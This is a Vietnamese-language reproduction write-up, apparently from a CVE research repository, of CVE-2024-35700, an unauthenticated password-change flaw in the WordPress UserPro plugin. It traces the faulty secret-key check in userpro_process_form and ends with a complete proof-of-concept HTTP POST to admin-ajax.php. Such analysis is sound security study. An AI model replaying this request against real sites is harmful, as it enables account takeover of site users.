WordPress Userpro Plugin <= 5.1.8 is vulnerable to Privilege Escalation

WordPress: Critical Vulnerability Patched in UserPro Plugin. Unauthenticated Account Takeover (CVE-2024-35700).

Lỗi này ở mục change password

ở function userpro_process_form và có thể thấy rằng action là nopri (không cần quyền)

wp_ajax_nopriv_userpro_process_form

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/a0d2b8fc-2233-4354-a1aa-9e6231dc1b27)

template: change
shortcode: user_id
action: userpro_process_form

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/cc605d9b-1db9-4d87-8122-5d3b7fe8e5f3)

secretkey: cần phải lưu trữ trước ở database, (tức là cần phải requests secretkey trước)

Các bước

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/828d7b3b-f385-403d-a818-23cc15258095)
Đầu tiên web sẽ kiểm tra có secretkey lưu trên dbs không nếu không nó sẽ trả về thông tin users là rỗng
và khi tới dòng 588 nó trả về thông báo secretkey is invalid or expired

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/3cd411dd-a7d3-43dc-bebb-7c6b1709fdf9)

Tiếp theo, nếu có sẵn secret key trong database

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/52006963-fb66-4a9a-8b9a-1845f918cdea)

users sẽ nhận được dữ liệu của user cần được reset. (123)

Đoạn foreach sẽ kiểm tra secretkey nhập vào có trùng khớp với userpro_secret_key được lưu trong cơ sở dữ liệu không, nếu có nó sẽ thoát ra đoạn foreach

nếu không sau khi chạy xong dòng foreach nó cũng thoát ra và chạy tiếp ???

*theo logic trên thì đoạn kiểm tra trong foreach không có mục đích rõ ràng và không có tác dụng lớn*

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/c3a21b5b-1b09-4004-8c3f-98ae164648d4)

Sau khi thoát ra khỏi foreach đoạn code nhảy xuống 

```
if (!$users[0])
```
tuy nhiên users đã nhận được dữ liệu ở (123) nên sẽ nhảy qua đoạn else

-> thực thi thành công việc reset/ change password

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/62caa227-9250-48a4-82ed-936e5f92ea99)

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 124
Origin: http://localhost:8088
DNT: 1
Sec-GPC: 1
Connection: close
Referer: http://localhost:8088/?page_id=110
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

nonce=fef08061bb&template=change&action=userpro_process_form&pass=123&secretkey=123&shortcode=[userpro+''+template="change"]
```
POC
